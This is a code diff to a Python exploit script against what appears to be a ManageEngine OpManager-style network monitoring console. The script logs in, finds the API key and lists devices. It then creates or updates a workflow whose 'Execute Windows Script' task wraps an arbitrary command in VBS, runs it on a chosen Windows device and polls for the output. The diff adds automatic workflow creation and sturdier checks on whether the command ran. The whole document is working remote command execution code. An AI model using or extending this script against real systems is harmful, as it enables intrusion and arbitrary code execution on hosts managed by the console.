@@ -58,7 +58,7 @@ def parse_args():
         "-t",
         "--target",
         required=True,
-        help="Target base URL (e.g. http://targetserver or http://targetserver.kaiber.local)",
+        help="Target base URL (e.g. http://ms01 or http://ms01.corp.local)",
     )
     parser.add_argument(
         "-u",
@@ -81,18 +81,13 @@ def parse_args():
         "-wf",
         "--workflow-name",
         help='Workflow name to use (e.g. "testrce"). '
-             "If it already exists, it will be reused; otherwise a base workflow will be overwritten.",
+             "If it already exists, it will be reused; otherwise a new workflow will be created.",
     )
     parser.add_argument(
         "-d",
         "--device",
-        help='Device displayName to target (e.g. "targetserver"). '
+        help='Device displayName to target (e.g. "Ms01"). '
              "If omitted and not listing devices, the script will list devices and exit.",
-    )
-    parser.add_argument(
-        "--base-workflow-id",
-        default="305",
-        help="Existing workflow ID template to overwrite if named workflow not found (default: 305)",
     )
     parser.add_argument(
         "--poll-interval",
@@ -142,14 +137,6 @@ def build_base_url(target: str) -> str:
 
 # ----- Auth flow -----
 def full_login(session: requests.Session, base_url: str, username: str, password: str):
-    """
-    Reproduce full sign-in flow:
-
-      1) GET /
-      2) POST /servlets/SettingsServlet?requestType=AJAX&sid=<...>
-      3) POST /j_security_check;jsessionid=<JSESSIONID>
-    """
-
     root_url = f"{base_url}/"
     log_info("[*] Logging in...")
     log_debug("[*] Step 1: GET / to obtain initial JSESSIONID...")
@@ -160,7 +147,6 @@ def full_login(session: requests.Session, base_url: str, username: str, password
         log_warn("[!] No JSESSIONID cookie set after GET /. Login may fail later.")
     jsessionid = session.cookies.get("JSESSIONID")
 
-    # SettingsServlet
     login1_url = f"{base_url}/servlets/SettingsServlet"
     login1_params = {
         "requestType": "AJAX",
@@ -193,7 +179,6 @@ def full_login(session: requests.Session, base_url: str, username: str, password
     log_debug(f"[+] SettingsServlet HTTP {r.status_code}")
     log_debug(f"[*] Cookies after SettingsServlet: {session.cookies.get_dict()}")
 
-    # j_security_check
     jsessionid = session.cookies.get("JSESSIONID", jsessionid)
     if not jsessionid:
         log_warn("[!] Still no JSESSIONID; j_security_check may not bind properly.")
@@ -228,7 +213,6 @@ def full_login(session: requests.Session, base_url: str, username: str, password
     log_debug(f"[+] j_security_check HTTP {r.status_code}")
     log_debug(f"[*] Cookies after j_security_check: {session.cookies.get_dict()}")
 
-    # finalize with GET /
     log_debug("[*] Step 4: GET / again to finalize session...")
     r = session.get(root_url, headers={"User-Agent": "Mozilla/5.0"}, verify=False)
     log_debug(f"[+] Second GET / HTTP {r.status_code}")
@@ -303,9 +287,6 @@ def get_workflow_list(session: requests.Session, base_url: str, api_key: str):
 
 
 def find_workflow_by_name(workflow_list_json, name: str):
-    """
-    Find a workflow by name and return (wf_id, wf_name).
-    """
     workflows = []
 
     if isinstance(workflow_list_json, dict):
@@ -408,17 +389,12 @@ def print_device_list_and_exit(device_list_json):
     log_warn("[!] No -d / --device argument provided.")
     log_info("[*] These devices can be targeted (raw JSON):")
     print_device_list(device_list_json)
-    log_info("\n[*] Re-run the script with -d <displayName> (e.g. -d targetserver)")
+    log_info("\n[*] Re-run the script with -d <displayName> (e.g. -d Ms01)")
     sys.exit(0)
 
 
 # ----- VBS payload builder -----
 def build_cmd_vbs(command: str) -> str:
-    """
-    Build a VBS script that safely embeds the given command string and executes:
-
-        cmd /c <command>
-    """
     escaped_cmd = command.replace('"', '""')
 
     vbs = f"""Option Explicit
@@ -536,6 +512,132 @@ def build_json_data(workflow_id: str, workflow_name: str, command: str, device_n
     return "jsonData=" + urllib.parse.quote_plus(json_str)
 
 
+# ----- addWorkflow and updateWorkflow -----
+def add_workflow(
+    session: requests.Session,
+    base_url: str,
+    api_key: str,
+    workflow_name: str,
+    command: str,
+    device_name: str,
+):
+    """
+    Create a new workflow via /api/json/workflow/addWorkflow using a jsonData
+    structure similar to what was captured in Burp.
+    """
+    script_body = build_cmd_vbs(command)
+
+    json_obj = {
+        "taskProps": {
+            "mainTask": {
+                "taskID": 9,
+                "dialogId": 3,
+                "name": "Execute Windows Script",
+                "deviceDisplayName": "${DeviceName}",
+                "cmdLine": "cscript //Nologo ${FileName}.vbs ${DeviceName} ${UserName} ${Password} arg1",
+                "scriptBody": script_body,
+                "workingDir": "${UserHomeDir}",
+                "timeout": "60",
+                "associationID": -1,
+                "x": 52,
+                "y": 136,
+            },
+            "name": "Untitled",
+            "description": "",
+        },
+        "triggerProps": {
+            "workflowDetails": {
+                "wfID": "",
+                "wfName": workflow_name,
+                "wfDescription": "Description not given for this Workflow",
+                "triggerType": "1",
+            },
+            "selectedDevices": [device_name],
+            "scheduleDetails": {},
+            "criteriaDetails": {
+                "noofpolls": "1",
+                "selectAllRules": "no",
+                "chkNFAAlarm": "no",
+                "chkConfigBackupFailed": "no",
+                "chkConfigChangeDown": "no",
+                "devicemissespolls": "yes",
+                "hardwareMonitorCheck": "no",
+                "ucsFaultCheck": "no",
+                "chkStorageAlarm": "no",
+                "printerCheck": {"selected": "no"},
+                "ipslaCheck": {"selected": "all"},
+                "upsCheck": {"selected": "no"},
+                "interfaceAndPorts": {"selected": "no"},
+                "serviceCheck": {"selected": "no"},
+                "NTserviceCheck": {"selected": "no"},
+                "mssqlServiceCheck": {"selected": "no"},
+                "adServiceCheck": {"selected": "no"},
+                "exchangeServiceCheck": {"selected": "no"},
+                "exchangeMonitorCheck": {"selected": "no"},
+                "adMonitorCheck": {"selected": "no"},
+                "mssqlMonitorCheck": {"selected": "no"},
+                "trapsCheck": {"selected": "no"},
+                "thresholdCheck": {"selected": "no"},
+                "urlCheck": {"selected": "no"},
+                "ScriptMonitorCheck": {"selected": "no"},
+                "processMonitorCheck": {"selected": "no"},
+                "FileMonitorCheck": {"selected": "no"},
+                "FolderMonitorCheck": {"selected": "no"},
+                "eventLogCheck": {"selected": "no"},
+                "agentDownCheck": "no",
+                "sysLogCheck": {"selected": "no"},
+                "VirtualDeviceMonitorCheck": {
+                    "selected": "no",
+                    "supportedVirtualDeviceMonitors": [],
+                },
+                "clearalarm": "no",
+                "notifySeverity": ["1", "2", "3"],
+                "timeWindow": {
+                    "twoption": "All",
+                    "startTime": "",
+                    "endTime": "",
+                    "selectAllDaysChkBox": "no",
+                    "daysSelected": [],
+                },
+                "trigger": {
+                    "delayAck": "off",
+                    "triggerAck": "off",
+                },
+            },
+        },
+    }
+
+    json_str = json.dumps(json_obj, separators=(",", ":"))
+    data = "jsonData=" + urllib.parse.quote_plus(json_str)
+
+    url = f"{base_url}/api/json/workflow/addWorkflow"
+    params = {"apiKey": api_key}
+    headers = {
+        "User-Agent": "Mozilla/5.0",
+        "Accept": "application/json, text/javascript, */*; q=0.01",
+        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+        "X-Requested-With": "XMLHttpRequest",
+        "Origin": base_url,
+        "Referer": f"{base_url}/apiclient/ember/index.jsp",
+        # OPMCurrentRoute here is not strictly required for backend behavior
+    }
+
+    log_info(f"[*] Creating new workflow '{workflow_name}'...")
+    r = session.post(
+        url,
+        params=params,
+        data=data,
+        headers=headers,
+        verify=False,
+    )
+    log_debug(f"[+] addWorkflow HTTP {r.status_code}")
+    if r.status_code != 200:
+        log_error("[!] addWorkflow failed")
+        log_debug(r.text[:500])
+        sys.exit(1)
+    log_good("[+] addWorkflow completed (check workflow list for new entry).")
+
+
 def update_workflow(
     session: requests.Session,
     base_url: str,
@@ -578,6 +680,7 @@ def update_workflow(
         log_good("[+] Workflow updated successfully.")
 
 
+# ----- executeWorkflow and status -----
 def execute_workflow(
     session: requests.Session,
     base_url: str,
@@ -718,7 +821,6 @@ def main():
     log_info(f"[*] Target:  {base_url}")
     log_info(f"[*] User:    {args.user}")
 
-    # Mode validation
     listing_mode = args.list_workflows or args.list_devices
     exploit_mode = not listing_mode
 
@@ -740,7 +842,6 @@ def main():
         full_login(session, base_url, args.user, args.password)
         api_key = extract_api_key(session, base_url)
 
-        # Device list (we need this for both listing and exploitation)
         device_list = get_device_list_for_filter(
             session, base_url, api_key, args.filter_id
         )
@@ -767,26 +868,43 @@ def main():
                 f"name='{device_name}', moid='{device_moid}'"
             )
         else:
-            device_name = device_moid = None  # Not used in listing modes
+            device_name = device_moid = None
 
-        # Workflow list (needed for both listing and exploit)
         wf_list = get_workflow_list(session, base_url, api_key)
 
         if args.list_workflows and not exploit_mode:
             print(json.dumps(wf_list, indent=2))
             sys.exit(0)
 
-        # Exploit path
+        # Exploit path: find or create workflow
         wf_id, wf_name = find_workflow_by_name(wf_list, args.workflow_name)
 
         if wf_id:
             log_good(f"[+] Found existing workflow '{wf_name}' with ID {wf_id}")
         else:
-            log_warn(f"[!] Workflow '{args.workflow_name}' not found in list")
-            log_info(f"[*] Falling back to base workflow ID {args.base_workflow_id}")
-            wf_id = args.base_workflow_id
-            wf_name = args.workflow_name
+            log_warn(f"[!] Workflow '{args.workflow_name}' not found in list, creating it...")
+            add_workflow(
+                session,
+                base_url,
+                api_key,
+                workflow_name=args.workflow_name,
+                command=args.command,
+                device_name=device_name,
+            )
 
+            # Refresh list and resolve actual ID
+            wf_list = get_workflow_list(session, base_url, api_key)
+            wf_id, wf_name = find_workflow_by_name(wf_list, args.workflow_name)
+            if not wf_id:
+                log_error("[!] Failed to find newly created workflow in list; aborting.")
+                if DEBUG:
+                    log_debug("[*] Full workflow list after creation attempt:")
+                    log_debug(json.dumps(wf_list, indent=2))
+                sys.exit(1)
+
+            log_good(f"[+] Created new workflow '{wf_name}' with ID {wf_id}")
+
+        # Now wf_id is a real ID; update it with our current command
         json_data_str = build_json_data(
             workflow_id=wf_id,
             workflow_name=wf_name,
@@ -844,6 +962,18 @@ def main():
                 time.sleep(args.poll_interval)
                 continue
 
+            # Handle error wrapper: {"error":{"message":"...","code":5013}}
+            if isinstance(j, dict) and "error" in j:
+                err = j["error"]
+                msg = err.get("message", "")
+                code = err.get("code", "")
+                log_error(f"[!] getWorkflowExecutionStatus error code={code}, message={msg}")
+                log_error("[!] Treating this as execution failure (no output).")
+                if DEBUG:
+                    log_debug("[*] Raw error JSON:")
+                    log_debug(json.dumps(j, indent=2))
+                sys.exit(1)
+
             status = ""
             if isinstance(j, list) and j:
                 first = j[0]
@@ -862,6 +992,13 @@ def main():
                 output_printed = True
 
             if isinstance(status, str) and status.upper() in ("COMPLETED", "FAILED", "SUCCESS"):
+                if not output_printed:
+                    log_error("[!] Workflow reached terminal state but no script output was found.")
+                    log_error("[!] This indicates the command likely did NOT execute as expected.")
+                    if DEBUG:
+                        log_debug("[*] Full status JSON for debugging:")
+                        log_debug(json.dumps(j, indent=2))
+                    sys.exit(1)
                 break
 
             time.sleep(args.poll_interval)
